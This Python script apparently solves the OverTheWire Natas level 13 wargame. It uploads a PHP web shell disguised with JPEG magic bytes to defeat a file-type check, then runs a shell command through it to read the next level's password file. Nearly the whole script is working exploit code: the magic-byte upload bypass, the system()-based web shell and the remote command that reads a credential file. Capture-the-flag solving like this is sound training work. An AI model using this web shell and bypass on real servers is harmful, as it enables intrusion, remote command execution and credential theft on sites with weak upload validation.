import requests
import sys
import argparse
import re
import time

# Function to perform login with basic authentication
def login(url, user, password, proxies=None):
    print("[+] Logging in as natas12...")
    time.sleep(1)
    # Performing basic authentication with the "auth" argument.
    response = requests.get(url, auth=(user, password), proxies=proxies)
    if response.status_code == 200:
        print("[+] Logged in successfully!")
        time.sleep(1)
    else:
        print("[-] Failed to log in :(")
        print("[-] Exiting...")
        sys.exit(1)

def shellupload(url, user, password, proxies=None):
    print("[+] Uploading web shell...")
    time.sleep(1)

    # Defining the jpeg Magic byte
    jpeg_magic_bytes = b'\xFF\xD8\xFF\xE0'
    payload = jpeg_magic_bytes + b'<?php system($_GET["cmd"]);?>'

    # Defining the file data to upload
    multipart_data = {
    'MAX_FILE_SIZE': (None, '1000'),
    'filename': (None, 'bnmghoijxg.php'),
    'uploadedfile': ('script.php', payload, 'application/octet-stream')
    }

    response = requests.post(url, auth = (user, password), files=multipart_data, proxies=proxies)
    content = response.text
    if 'upload/' in content:
        print("[+] Uploaded the file successfully")
        time.sleep(1)
    else:
        print("[+] Failed to upload the file.")
        sys.exit(1)

    pattern = r"upload/(.*)"
    path = (re.search(pattern, content).group(1)).split('"')[0]
    print(f"[+] The file is at '/upload/{path}'")
    print(f'[+] To run commands, go to {url}/upload/{path}?cmd=whoami')
    time.sleep(1)

    return path


# Function to extract the password from the response
def getpass(url, user, password, path, proxies=None):
    print(f"[+] Getting the password...")
    time.sleep(1)

    payload = 'cat /etc/natas_webpass/natas14'

    url = url + f"/upload/{path}?cmd={payload}"
    
    response = requests.get(url, auth=(user, password), proxies=proxies)
    content = response.text

    # Define regex pattern to find the password
    pattern = r'([A-Za-z0-9]{32})\n'
    # Using regex to search for password and extract it.
    passwd = (re.search(pattern, content).group())
    print(f"[+] The password of natas14 is: {passwd}")

def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Grabs the password of natas14 by exploiting a file upload to read the password file.")
    parser.add_argument('-p', '--password', help='Password of Natas13.', required=True, metavar='Password')
    parser.add_argument('-x', '--proxy', help='Sends requests through Burp Suite proxy at 127.0.0.1:8080.', action='store_true')
    args = parser.parse_args()

    # Define URL and authentication credentials
    user = 'natas13'
    url = f'http://{user}.natas.labs.overthewire.org'
    password = args.password
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

    # Check if proxy option is enabled and perform login
    if args.proxy:
        login(url, user, password, proxies=proxies)
        path = shellupload(url, user, password, proxies=proxies)
        getpass(url, user, password, path, proxies=proxies)

    else:
        login(url, user, password)
        path = shellupload(url, user, password)
        getpass(url, user, password, path)
    
if __name__ == "__main__":
    main()